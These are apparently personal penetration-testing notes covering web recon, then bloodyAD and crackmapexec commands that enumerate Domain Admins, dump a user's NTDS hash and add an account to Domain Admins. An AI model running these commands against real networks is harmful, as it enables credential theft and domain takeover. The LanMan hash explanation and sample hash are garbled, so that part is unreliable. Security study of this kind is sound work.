## Random Notes  




### Recon  
recon: Go to linked and see what technologies they're using  
What tooling do they use? What's exposed to internet?  

Footprinting:  
```bash  
curl -I hostname.com/:port  
```
ningx/1.25.2, now I just have to look for vulns in nginx 1.25.X

* When looking for XSS also look for SSTI or CSTI  

---  

* As a blue teamer, you should run Blood Hound regularly and analyze its output.  
* As a red teamer, your job is not to fix the vulnerabilities. Your job is to report  
  the vulnerabilities to the client. It is their decision to make about how to reconfigure their  
  environment.

### bloodyAD  
```bash  
bloodyAD -h 
bloodyAD -d 'domain.name' -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 get children --target 'Domain Admins'  

# When windows stores a password, it stores NTLM hashes,
# and they all will have the same LandMan hash NTDS hashes.  
# LandMan hashes are not stored anymore.  
# For legacy purposes they still have an entry in there.  
# The second hash from cme smb will be the second hash separated by the colon.  
# You can just use a colon and the NT hash ( :B0B4D2498249AO54UJ9D06E )  
cme smb 10.10.10.2 -u 'users.name' -p 'seek' --ntds --user robert.almstead  

bloodyAD -d "mydomain.local" -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 get membership ''  

bloodyAD -d "mydomain.local" -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 add groupMember 'Domain Admins' 'robert.olmstead'  

bloodyAD -d "mydomain.local" -u 'users.name' -p 'passwordgoeshere' \
--host 10.10.10.2 remove groupMember 'Domain Admins' 'users.name'  
```
